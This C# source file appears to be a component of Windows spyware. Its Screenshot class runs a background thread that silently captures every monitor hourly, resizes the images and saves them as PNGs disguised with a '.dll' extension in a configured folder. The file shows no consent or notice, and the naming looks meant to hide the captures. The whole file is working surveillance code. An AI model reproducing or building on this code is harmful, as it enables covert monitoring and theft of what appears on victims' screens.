using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using System.Drawing.Imaging;

namespace Nagoya_Monster
{
    static class Screenshot
    {
        private static bool IsScreenShoting;
        private static bool IsRunning = false;
        private static string LastWindowTitle = string.Empty;
        private static string CurrentWindowTitle = string.Empty;

        public static void Start()
        {
            IsScreenShoting = true;
            new Thread(new ThreadStart(ScreenShotManager)).Start();
        }

        public static void Stop()
        {
            IsScreenShoting = false;
            IsRunning = false;
        }

        private static void ScreenShotManager()
        {
            if (!IsRunning)
            {
                IsRunning = true;

                while (IsScreenShoting)
                {
                    TakeScreenShot();

                    for (int i = 0; i < 1 * 60 * 60; i++)
                    {
                        if (!IsRunning || !IsScreenShoting)
                        {
                            IsRunning = false;
                            IsScreenShoting = false;
                        }
                        Thread.Sleep(TimeSpan.FromSeconds(1));
                    }
                }
            }
        }

        private static void TakeScreenShot()
        {
            for (int i = 0; i < Screen.AllScreens.Length; i++)
            {
                Screen monitor = Screen.AllScreens[i];
                Bitmap bitmap = new Bitmap(monitor.Bounds.Width, monitor.Bounds.Height);
                Graphics.FromImage(bitmap).CopyFromScreen(monitor.Bounds.X, monitor.Bounds.Y, 0, 0, bitmap.Size, CopyPixelOperation.SourceCopy);

                bitmap = new Bitmap(bitmap, 1280, 720);

                bitmap.Save(filename: $"{Program.SSPath}royal-{i}-{DateTime.Now.Ticks.ToString()}.dll", format: ImageFormat.Png);
            }
        }
    }
}
